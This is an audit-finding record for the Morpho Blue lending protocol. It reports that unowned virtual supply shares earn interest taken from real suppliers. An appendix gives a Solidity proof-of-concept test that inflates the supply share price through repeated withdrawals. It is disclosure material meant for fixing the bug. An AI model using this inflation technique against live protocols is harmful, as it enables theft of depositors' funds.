---
# Core Classification
protocol: Morpho
chain: everychain
category: uncategorized
vulnerability_type: unknown

# Attack Vector Details
attack_type: unknown
affected_component: smart_contract

# Source Information
source: solodit
solodit_id: 40871
audit_firm: Cantina
contest_link: https://cantina.xyz/portfolio/b695ccbb-9d8b-4cac-be69-706f8c3684e5
source_link: https://cdn.cantina.xyz/reports/cantina_competition_morpho_blue_dec2023.pdf
github_link: none

# Impact Classification
severity: medium
impact: security_vulnerability
exploitability: 0.00
financial_impact: medium

# Scoring
quality_score: 0
rarity_score: 0

# Context Tags
tags:

protocol_categories:
  - cdp
  - derivatives
  - dexes
  - services
  - yield_aggregator

# Audit Details
report_date: unknown
finders_count: 1
finders:
  - Christoph Michel
---

## Vulnerability Title

Virtual supply shares steal interest 

### Overview


This bug report is about a problem in the code for a virtual supply feature in the Morpho.sol file. The virtual supply shares, which are not owned by anyone, are earning interest in a function called _accrueInterest. This is causing a loss of interest funds for users because the interest is being taken from the actual suppliers. The report suggests that the virtual shares should not earn interest as they do not correspond to any supplier. The report also includes a code snippet showing how the bug can be exploited to increase the supply share price and give the virtual shares a bigger claim on the total asset percentage. The report recommends fixing this issue and provides a code example to demonstrate the expected behavior.

### Original Finding Content

## Context
Morpho.sol#L479

## Description
The virtual supply shares, that are not owned by anyone, earn interest in *accrueInterest*. This interest is stolen from the actual suppliers which leads to loss of interest funds for users. Note that while the initial share price of 1e-6 might make it seem like the virtual shares can be ignored, one can increase the supply share price and the virtual shares will have a bigger claim on the total asset percentage.

## Recommendation
The virtual shares should not earn interest as they don't correspond to any supplier.

## Appendix: Increasing Supply Share Price
```solidity
function testSupplyInflationAttack() public {
    vm.startPrank(SUPPLIER);
    loanToken.setBalance(SUPPLIER, 1 * 1e18);
    // 100x the price. in the end we end up with 0 supply and totalAssets = assets supplied here
    morpho.supply(marketParams, 99, 0, SUPPLIER, "");
    uint256 withdrawals = 0;
    for (;; withdrawals++) {
        (uint256 totalSupplyAssets, uint256 totalSupplyShares,,) = morpho.expectedMarketBalances(marketParams);
        // console2.log("totalSupplyShares", totalSupplyShares);
        uint256 shares = (totalSupplyShares + 1e6).mulDivUp(1, totalSupplyAssets + 1) - 1;
        // console2.log("shares", shares);
        // burn all of our shares, then break
        if (shares > totalSupplyShares) {
            shares = totalSupplyShares;
        }
        if (shares == 0) {
            break;
        }
        morpho.withdraw(marketParams, 0, shares, SUPPLIER, SUPPLIER);
    }
    (uint256 totalSupplyAssets, uint256 totalSupplyShares,,) = morpho.expectedMarketBalances(marketParams);
    console2.log("withdrawals", withdrawals);
    console2.log("totalSupplyAssets", totalSupplyAssets);
    console2.log("final share price %sx", (totalSupplyAssets + 1) * 1e6 / (totalSupplyShares + 1e6));
    // without inflation this should mint at initial share price of 1e6, i.e., 100 asset
    (uint256 returnAssets,) = morpho.supply(marketParams, 0, 1 * 1e6, SUPPLIER, "");
    console2.log("pulled in assets ", returnAssets);
}
```

### Metadata

| Field | Value |
|-------|-------|
| Impact | MEDIUM |
| Quality Score | 0/5 |
| Rarity Score | 0/5 |
| Audit Firm | Cantina |
| Protocol | Morpho |
| Report Date | N/A |
| Finders | Christoph Michel |

### Source Links

- **Source**: https://cdn.cantina.xyz/reports/cantina_competition_morpho_blue_dec2023.pdf
- **GitHub**: N/A
- **Contest**: https://cantina.xyz/portfolio/b695ccbb-9d8b-4cac-be69-706f8c3684e5

### Keywords for Search

`vulnerability`

